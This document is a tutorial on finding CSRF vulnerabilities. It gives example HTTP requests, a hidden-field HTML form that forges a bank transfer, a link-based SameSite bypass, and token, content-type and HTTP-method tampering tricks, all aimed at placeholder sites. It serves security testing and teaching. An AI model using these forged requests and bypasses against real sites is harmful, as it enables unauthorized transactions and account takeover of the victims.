**Methodology of Finding CSRF Vulnerabilities** with detailed explanations and practical examples.

---
## ✅ **1. Understanding CSRF (Cross-Site Request Forgery)**
**CSRF** is a type of web attack where a malicious website tricks a user’s browser into sending an unwanted request to a different website where the user is authenticated.
- **Goal of CSRF Attack**: Perform state-changing operations without the user’s consent.    
- **Examples of State-Changing Operations**:    
    - Changing account details        
    - Transferring funds        
    - Modifying passwords
---
## ✅ **2. Methodology to Find CSRF Vulnerabilities**
### **Step 1: Identify State-Changing Requests**
- Capture all requests using a proxy tool like **Burp Suite** or **OWASP ZAP**.    
- Focus on **POST** requests, especially those involving actions like:    
    - Account management        
    - Transactions        
    - Form submissions        
- State-changing operations typically involve cookies for authentication.

**Example Request**:
```
POST /transfer HTTP/1.1
Host: bank.com
Cookie: session=abcd1234
Content-Type: application/x-www-form-urlencoded

amount=1000&to_account=5678
```

👉 **This is a candidate for CSRF testing.**

---

### **Step 2: Create an Exploit Code**
- An attacker might craft a malicious HTML form to exploit the CSRF vulnerability.
**Example CSRF Exploit**:
```
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to_account" value="5678">
  <input type="submit" value="Submit Transaction">
</form>
```
👉 **If a logged-in victim clicks this form, it will execute the transaction without their knowledge.**

---
### **Step 3: Bypass the Security Mechanisms**
#### 🔎 **Check for CSRF Protection**
- Inspect for CSRF tokens using browser developer tools or intercept tools.
- If a token is missing, it’s a strong indication of vulnerability.   
---
## ✅ **3. Important Bypass Techniques for CSRF**
### **A. SameSite Cookie Flag**
- **SameSite** prevents cross-origin requests, protecting against CSRF.    
- Check the `Set-Cookie` response header:
`Set-Cookie: session=abcd1234; SameSite=Lax`
- **Bypass Possibilities**:    
    - **SameSite=None**: Vulnerable to CSRF without restrictions.        
    - **SameSite=Lax**: Allows CSRF via top-level navigations using `GET` requests.        
    - **SameSite=Strict**: Prevents CSRF even on top-level navigations.       

👉 **Example Bypass** (If `SameSite=Lax`):
`<a href="https://bank.com/transfer?amount=1000&to_account=5678">Click here to win a prize!</a>`

---
### **B. JSON Requests**
- JSON endpoints often use `application/json` content-type.    
- If the API accepts multiple content types, try using:
    `Content-Type: application/x-www-form-urlencoded`
- Some endpoints may lack token validation for non-JSON content.

👉 **Example Request Tampering**:
```
POST /api/update-profile HTTP/1.1
Host: website.com
Content-Type: application/json

{"email": "attacker@example.com"}
```

👉 **Change to**:
```
POST /api/update-profile HTTP/1.1
Host: website.com
Content-Type: application/x-www-form-urlencoded

email=attacker@example.com
```

---
### **C. CSRF Token Manipulation**
- Try bypassing token validation by:    
    - Removing the token        
    - Submitting an empty token        
    - Using your own valid token        
👉 **Example 1 - Remove the Token**:
`POST /transfer HTTP/1.1 
`amount=1000&to_account=5678`

👉 **Example 2 - Send Empty Token**:
`POST /transfer HTTP/1.1 
`amount=1000&to_account=5678&csrf_token=`

👉 **Example 3 - Use Valid Token**:
`POST /transfer HTTP/1.1 
`amount=1000&to_account=5678&csrf_token=YOUR_VALID_TOKEN`

---
### **D. Verb Tampering**
- Some APIs may allow request method tampering.   

👉 **Example**:
`POST /change-email HTTP/1.1 
`email=attacker@example.com&csrf_token=valid_token`

👉 Try converting it to a `GET` request:
`GET /change-email?email=attacker@example.com&csrf_token=valid_token HTTP/1.1`

---
### **E. CSRF Token in Headers vs. Body**
- Tokens are often sent in headers like this:
`POST /payment HTTP/1.1 
`X-CSRF-Token: abc123`
- Some backends may fail to validate if the token is moved to the body instead.
👉 **Bypass Example**:
```
POST /payment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

amount=1000&X-CSRF-Token=abc123
```

---

## ✅ **4. Additional Tips for Effective CSRF Testing**
1. **Test Different User Roles**:    
    - Admins may have actions that are more impactful when exploited using CSRF.
2. **Check Mobile and API Endpoints**:    
    - Mobile apps often lack CSRF protections.        
3. **Use Burp Suite Extensions**:    
    - **CSRF PoC Generator** can create test payloads quickly.
---
## ✅ **5. Conclusion**
- CSRF vulnerabilities arise when state-changing requests lack proper CSRF token validation.    
- Methods to exploit and bypass CSRF protections include:    
    - Changing request content types        
    - Manipulating CSRF tokens        
    - Exploiting SameSite flag misconfigurations        
- Always generate proof-of-concept (PoC) code to demonstrate the vulnerability effectively.
